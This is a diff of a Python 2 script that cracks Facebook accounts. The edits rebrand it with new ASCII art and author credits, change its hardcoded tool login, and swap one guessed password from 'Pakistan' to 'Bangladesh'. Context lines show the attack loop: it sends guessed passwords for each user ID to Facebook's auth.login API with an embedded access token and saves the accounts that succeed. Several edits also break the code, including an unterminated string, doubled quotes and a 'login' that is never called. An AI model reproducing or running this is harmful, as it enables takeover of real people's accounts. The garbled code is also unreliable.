@@ -46,20 +46,96 @@ def jalan(z):
 		time.sleep(00000.1)
 
 
-##### LOGO #####
+_,.-------.,_
+
+                            ,;~'             '~;,
+
+                          ,;                     ;,
+
+                         ;                         ;
+
+                        ,'                         ',
+
+                       ,;                           ;,
+
+                       ; ;      .           .      ; ;
+
+                       | ;   ______       ______   ; |
+
+                       |  `/~"     ~" . "~     "~\'  |
+
+                       |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
+
+                        |   |        }:{        |   |
+
+                        |   l       / | \       !   |
+
+                        .~  (__,.--" .^. "--.,__)  ~.
+
+                        |     ---;' / | \ `;---     |
+
+                         \__.       \/^\/       .__/
+
+                          V| \                 / |V
+
+       __                  | |T~\___!___!___/~T| |                  _____
+
+    .-~  ~"-.              | |`IIII_I_I_I_IIII'| |               .-~     "-.
+
+   /         \             |  \,III I I I III,/  |              /           Y
+
+  Y          ;              \   `~~~~~~~~~~'    /               i           |
+
+  `.   _     `._              \   .       .   /               __)         .'
+
+    )=~         `-.._           \.    ^    ./           _..-'~         ~"<_
+
+ .-~                 ~`-.._       ^~~~^~~~^       _..-'~                   ~.
+
+/                          ~`-.._           _..-'~                           Y
+
+{        .~"-._                  ~`-.._ .-'~                  _..-~;         ;
+
+ `._   _,'     ~`-.._                  ~`-.._           _..-'~     `._    _.-
+
+    ~~"              ~`-.._                  ~`-.._ .-'~              ~~"~
+
+  .----.            _..-'  ~`-.._                  ~`-.._          .-~~~~-.
+
+ /      `.    _..-'~             ~`-.._                  ~`-.._   (        ".
+
+Y        `=--~                  _..-'  ~`-.._                  ~`-'         |
+
+|                         _..-'~             ~`-.._                         ;
+
+`._                 _..-'~                         ~`-.._            -._ _.'
+
+   "-.="      _..-'~                                     ~`-.._        ~`.
+
+    /        `.                                                ;          Y
+
+   Y                                 Amb Miraj............     |
+
+   |           ;                                              `.          /
+
+   `.       _.'                                                 "-.____.-'
+
+     ~-----"
 logo = """ -----------------------------•◈•
 (  __)\\ ____--------------_------------•◈•
-|__(~)    •||•THE - AAHIL -OFFICAL------•◈•
-|__\~~) •||•RANA - RAJPUT---------------•◈•
-|__(-----\  •◈•------BLACK-TIGER--------•◈•
+|__(~)    •||•Amb- Miraj-----•◈•
+|__\~~) •||.---------------•◈•
+|__(-----\  •◈•------BLACK...420--------•◈•
 |__~~~\ •◈•-----█-------⑦-------█------•◈•
 |__~~~\ •◈•-----█-------⑧-------█------•◈•
 |__~~~\ •◈•-----█-------⑥-------█------•◈•
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;FlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1; Aahilrna4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://github.com/Therana/zero
+
+▄▀█ █▀▄▀█ █▄▄   █▀▄▀█ █ █▀█ ▄▀█ ░░█
+
+█▀█ █░▀░█ █▄█   █░▀░█ █ █▀▄ █▀█ █▄█
+
+
 \033[1;91m======================================="""
 
 def tik():
@@ -80,15 +156,15 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mRana Aahil
-\033[1;96mInstagram \033[1;93m: \033[1;92mFlowRana
-\033[1;96mFacebook  \033[1;93m: \033[1;92m Aahilrana4072
-\033[1;96mGithub \033[1;93m: \033[1;92mhttps://Github.com/Therana/zero
+\033
+\033[
+\0
+\033[1;96mGithub \033[1;93m: \033[1;92https://github.com/ambmiraj007/miraj008
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "black"
+CorrectPassword = "420"
 
 loop = 'true'
 while (loop == 'true'):
@@ -288,7 +364,7 @@ def pilih_super():
 	for o in titik:
 		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
-	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
+	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press ENTER )
 	print 42*"\033[1;96m="
 	
 			
@@ -344,7 +420,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan'
+									pass4 = ''Bangladesh''
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -416,4 +492,4 @@ def pilih_super():
 	menu()
 
 if __name__ == '__main__':
-	login()
+	login
